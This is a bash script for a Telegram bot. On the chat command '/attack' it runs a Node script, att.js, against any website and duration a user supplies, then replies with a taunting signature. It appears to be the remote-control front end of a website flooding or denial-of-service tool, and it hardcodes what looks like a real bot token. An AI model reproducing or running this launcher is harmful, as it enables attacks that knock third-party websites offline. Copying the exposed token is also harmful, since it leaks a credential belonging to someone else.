#!/bin/bash

# Replace "YOUR_TELEGRAM_BOT_TOKEN" with your actual Telegram bot token
TOKEN="6311954830:AAFelhOxi5GkzecWwiQIccxvXnfc1rppOQI"

# Function to handle the /attack command
function attack_command() {
    local website="$1"
    local time="$2"

    # Run the node command and capture output and exit code
    output=$(node att.js "$website" "$time" 2>&1)
    exit_code=$?

    # Check if node command ran successfully
    if [[ $exit_code -eq 0 ]]; then
        # If successful, send success message to user
        send_message "MD OMOR FARUK 😈"
    else
        # If failed, send error message to user
        send_message "Error: $output"
    fi
}

# Function to send message to user
function send_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$chat_id&text=$message"
}

# Main function to handle incoming messages
function main() {
    local update_id=""
    while true; do
        # Get updates from Telegram
        updates=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$update_id")

        # Check if there are any new messages
        if [[ $(echo "$updates" | jq '.result | length') -gt 0 ]]; then
            # Process each update
            for update in $(echo "$updates" | jq -r '.result[] | @base64'); do
                # Decode update
                chat_id=$(echo "$update" | base64 --decode | jq -r '.message.chat.id')
                text=$(echo "$update" | base64 --decode | jq -r '.message.text')

                # Check if message is the /attack command
                if [[ $text == "/attack"* ]]; then
                    # Extract website URL and time from message
                    website=$(echo "$text" | awk '{print $2}')
                    time=$(echo "$text" | awk '{print $3}')

                    # Run the attack command
                    attack_command "$website" "$time"
                fi

                # Set update_id to last update_id
                update_id=$(echo "$update" | base64 --decode | jq -r '.update_id')
            done
        fi

        # Sleep for 1 second before checking for new updates again
        sleep 1
    done
}

# Run the main function
main
